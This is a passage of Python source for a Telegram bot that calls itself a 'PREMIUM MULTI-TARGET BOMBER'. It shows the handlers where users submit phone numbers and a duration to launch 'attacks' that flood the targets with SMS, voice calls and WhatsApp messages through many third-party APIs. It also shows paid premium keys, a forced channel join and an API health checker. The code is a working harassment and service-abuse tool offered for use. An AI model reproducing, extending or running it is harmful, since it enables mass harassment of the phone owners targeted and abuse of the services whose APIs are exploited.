    text = update.message.text
    
    if uid == OWNER_ID and context.user_data.get('waiting_for_genkey'):
        await generate_key_logic(update, context, text)
        return
    
    if uid == OWNER_ID and context.user_data.get('waiting_for_broadcast'):
        await broadcast_logic(update, context, text)
        return
    
    if uid == OWNER_ID and context.user_data.get('waiting_for_channel'):
        context.user_data['waiting_for_channel'] = False
        channel = text.strip().strip('@')
        if 't.me/' in channel:
            channel = channel.split('t.me/')[-1]
        channel = channel.split('?')[0].split('/')[0].strip()
        if not channel:
            await update.message.reply_text("❌ Invalid channel! Send like: @yourchannel ya https://t.me/yourchannel")
            return
        await manager.db.set_channel(channel)
        await update.message.reply_text(f"✅ Channel SET!\n\n📣 Users must join: @{channel}\n\nAb bot use karne ke liye sabko ye channel join karna hoga. 🔒")
        return
    
    await manager.db.add_user(uid)
    if not await check_channel_join(update, context):
        return
    
    if text == "🚀 /mix" or text == "/mix":
        await mix_command(update, context)
    elif text == "📊 /status" or text == "/status":
        await status_command(update, context)
    elif text == "👤 /account" or text == "/account":
        await account_command(update, context)
    elif text == "💳 /plan" or text == "/plan":
        await plan_command(update, context)
    elif text == "🔑 /redeem" or text == "/redeem":
        await redeem_command(update, context)
    elif text == "🛡 /protect" or text == "/protect":
        await protect_command(update, context)
    elif text == "🔓 /unprotect" or text == "/unprotect":
        await unprotect_command(update, context)
    elif text == "❓ /help" or text == "/help":
        await help_command(update, context)
    elif text == "👑 Admin" and uid == OWNER_ID:
        await show_admin_panel(update, context)
    elif context.user_data.get('waiting_for_target_count'):
        pass
    elif context.user_data.get('waiting_for_numbers') and text.strip():
        await process_numbers(update, context, text)
    elif context.user_data.get('waiting_for_redeem'):
        context.user_data['waiting_for_redeem'] = False
        success, days, plan, exp = await manager.db.redeem(uid, text.strip().upper())
        if success:
            await update.message.reply_text(f"✅ Premium Activated!\n📋 Plan: {plan.upper()}\n📅 Expiry: {exp}")
        else:
            await update.message.reply_text("❌ Invalid or already used code.")
    elif context.user_data.get('waiting_for_protect') and text.isdigit() and len(text) == 10:
        context.user_data['waiting_for_protect'] = False
        await manager.db.protect(uid, text)
        await update.message.reply_text(f"🛡 Protected: {text}")
    elif text == "/cancel":
        for k in ['waiting_for_target_count', 'waiting_for_numbers', 'waiting_for_redeem', 'waiting_for_protect', 'waiting_for_genkey', 'waiting_for_broadcast', 'expected_targets']:
            context.user_data.pop(k, None)
        manager.db.clear_attack_data(uid)
        await update.message.reply_text("❌ Cancelled.", reply_markup=main_kb(uid))

# ========== BUTTON HANDLER ==========
async def btn_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id
    if not await check_channel_join(update, context):
        return
    data = query.data
    
    if data == "adm_gen_standard" and uid == OWNER_ID:
        code = await manager.db.generate_code(30, "standard")
        await query.message.reply_text(f"✅ STANDARD KEY GENERATED!\n\n🔑 Code: `{code}`\n📅 Days: 30\n📋 Plan: STANDARD\n\nSend this code to user.", parse_mode="Markdown")
    
    elif data == "adm_gen_premium" and uid == OWNER_ID:
        code = await manager.db.generate_code(30, "premium")
        await query.message.reply_text(f"✅ PREMIUM KEY GENERATED!\n\n🔑 Code: `{code}`\n📅 Days: 30\n📋 Plan: PREMIUM\n\nSend this code to user.", parse_mode="Markdown")
    
    elif data == "adm_gen_ultimate" and uid == OWNER_ID:
        code = await manager.db.generate_code(30, "ultimate")
        await query.message.reply_text(f"✅ ULTIMATE KEY GENERATED!\n\n🔑 Code: `{code}`\n📅 Days: 30\n📋 Plan: ULTIMATE\n\nSend this code to user.", parse_mode="Markdown")
    
    elif data == "adm_custom_key" and uid == OWNER_ID:
        context.user_data['waiting_for_genkey'] = True
        await query.message.reply_text("🔑 Send custom key details:\nFormat: `days plan_type`\nExample: `30 standard`\n\nAvailable plans: standard, premium, ultimate", parse_mode="Markdown")
    
    elif data.startswith("targets_"):
        count = int(data.split("_")[1])
        context.user_data['waiting_for_target_count'] = False
        context.user_data['waiting_for_numbers'] = True
        context.user_data['expected_targets'] = count
        await query.edit_message_text(f"📞 Send {count} phone number(s) separated by space or new line:\nExample: {' '.join(['9876543210'] * count)}")
    
    elif data.startswith("dur_"):
        targets = manager.db.get_attack_data(uid)
        if not targets:
            await query.edit_message_text("❌ Session expired. Use /mix again.")
            return
        duration = int(data.split("_")[1])
        success, msg = await manager.start_attack(uid, targets, duration)
        if success:
            await query.edit_message_text(f"🚀 MULTI-TARGET ATTACK STARTED!\n🎯 Targets: {', '.join(targets)}\n📊 Count: {len(targets)}\n{msg}")
        else:
            await query.edit_message_text(f"❌ {msg}")
        manager.db.clear_attack_data(uid)
    
    elif data == "cancel_attack":
        manager.db.clear_attack_data(uid)
        for k in ['waiting_for_target_count', 'waiting_for_numbers', 'expected_targets']:
            context.user_data.pop(k, None)
        await query.edit_message_text("❌ Cancelled.")
    
    elif data == "stop":
        if await manager.stop_attack(uid):
            await query.edit_message_text("🛑 All attacks stopped.")
        else:
            await query.answer("No active attack.")
    
    elif data == "adm_broadcast" and uid == OWNER_ID:
        context.user_data['waiting_for_broadcast'] = True
        await query.message.reply_text("📢 Send your broadcast message to all users:")
    
    elif data == "adm_stats" and uid == OWNER_ID:
        u, p, c = await manager.db.get_stats()
        await query.message.reply_text(f"📊 BOT STATISTICS\n\n👥 Total Users: {u}\n⭐ Premium Users: {p}\n🔑 Generated Codes: {c}\n💎 Owner ID: {OWNER_ID}")
    
    elif data == "adm_set_channel" and uid == OWNER_ID:
        context.user_data['waiting_for_channel'] = True
        await query.message.reply_text("📣 Send your channel username or link:\n\nExamples:\n• @yourchannel\n• https://t.me/yourchannel\n\nSend the channel you want users to join before using the bot.")
    
    elif data == "adm_remove_channel" and uid == OWNER_ID:
        await manager.db.remove_channel()
        await query.message.reply_text("🗑 Channel removed! Bot is now open for everyone.")
    
    # ========== NEW: CHECK WORKING APIS ==========
    elif data == "adm_check_apis" and uid == OWNER_ID:
        status_msg = await query.message.reply_text("🔍 Checking all APIs... Please wait.\n\n⏳ This may take 1-2 minutes...")
        
        try:
            working, failed = await manager.check_working_apis()
            
            total = len(APIS)
            working_count = len(working)
            failed_count = len(failed)
            
            result_msg = f"📊 WORKING APIs STATUS\n\n"
            result_msg += f"✅ Total APIs Tested: {total}\n"
            result_msg += f"✅ Working APIs: {working_count}\n"
            result_msg += f"❌ Failed APIs: {failed_count}\n\n"
            
            if working:
                result_msg += "✅ WORKING APIs LIST:\n"
                for i, name in enumerate(working, 1):
                    result_msg += f"{i}. {name}\n"
                    if i >= 30:
                        result_msg += f"... and {len(working) - 30} more\n"
                        break
            
            if failed:
                result_msg += "\n❌ FAILED APIs (Sample):\n"
                for i, name in enumerate(failed[:10], 1):
                    result_msg += f"{i}. {name}\n"
                if len(failed) > 10:
                    result_msg += f"... and {len(failed) - 10} more\n"
            
            await status_msg.edit_text(result_msg)
            
        except Exception as e:
            await status_msg.edit_text(f"❌ Error checking APIs: {str(e)}")
    
    elif data == "info":
        con = await manager.db.get_concurrent_limit(uid)
        await query.answer(f"⚡ {con}x Concurrent Workers Per Target\n📡 Total APIs: {len(APIS)}", show_alert=True)

async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not await check_channel_join(update, context):
        return
    for k in ['waiting_for_target_count', 'waiting_for_numbers', 'waiting_for_redeem', 'waiting_for_protect', 'waiting_for_genkey', 'waiting_for_broadcast', 'expected_targets']:
        context.user_data.pop(k, None)
    manager.db.clear_attack_data(uid)
    await update.message.reply_text("❌ Cancelled.", reply_markup=main_kb(uid))

async def shutdown_handler(signal, loop):
    logger.info(f"Received exit signal {signal.name}...")
    if manager:
        await manager._close_session()
    tasks = [t for t in asyncio.all_tasks() if t is not asyncio.current_task()]
    [task.cancel() for task in tasks]
    logger.info(f"Cancelling {len(tasks)} outstanding tasks")
    await asyncio.gather(*tasks, return_exceptions=True)
    loop.stop()

def main():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    global db
    db = SqliteStorage(DB_PATH)
    
    async def init_indexes():
        await db.ensure_indexes()
    
    loop.run_until_complete(init_indexes())
    
    global database
    database = DatabaseWrapper()
    
    global manager
    manager = AttackManager()
    
    for sig in (signal.SIGINT, signal.SIGTERM):
        loop.add_signal_handler(sig, lambda: asyncio.create_task(shutdown_handler(sig, loop)))
    
    app = (Application.builder()
           .token(BOT_TOKEN)
           .read_timeout(30)
           .write_timeout(30)
           .connect_timeout(30)
           .pool_timeout(30)
           .build())
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("mix", mix_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("account", account_command))
    app.add_handler(CommandHandler("plan", plan_command))
    app.add_handler(CommandHandler("redeem", redeem_command))
    app.add_handler(CommandHandler("protect", protect_command))
    app.add_handler(CommandHandler("unprotect", unprotect_command))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("cancel", cancel_command))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_msg))
    app.add_handler(CallbackQueryHandler(btn_handler))
    
    logger.info("=" * 60)
    logger.info(f"🔥 PREMIUM MULTI-TARGET BOMBER Started")
    logger.info(f"📡 Total APIs Loaded: {len(APIS)}")
    logger.info(f"📞 Voice/Call APIs: Included")
    logger.info(f"💬 SMS APIs: Included")
    logger.info(f"📱 WhatsApp APIs: Included")
    logger.info(f"👑 Admin Panel Ready")
    logger.info(f"🌐 Web Server Running on Port {PORT}")
    logger.info(f"🗄️ Using SQLite Storage")
    logger.info(f"🤖 Bot Token: {BOT_TOKEN[:10]}...")
    logger.info("=" * 60)
    
    loop.create_task(web_server())
    
    if USE_WEBHOOK and WEBHOOK_URL:
        logger.info(f"🌐 Starting bot with webhook: {WEBHOOK_URL}")
        app.run_webhook(
            listen="0.0.0.0",
            port=PORT,
            url_path=BOT_TOKEN,
            webhook_url=f"{WEBHOOK_URL}/{BOT_TOKEN}",
            drop_pending_updates=True
        )
    else:
        logger.info("📱 Starting bot with polling mode")
        app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
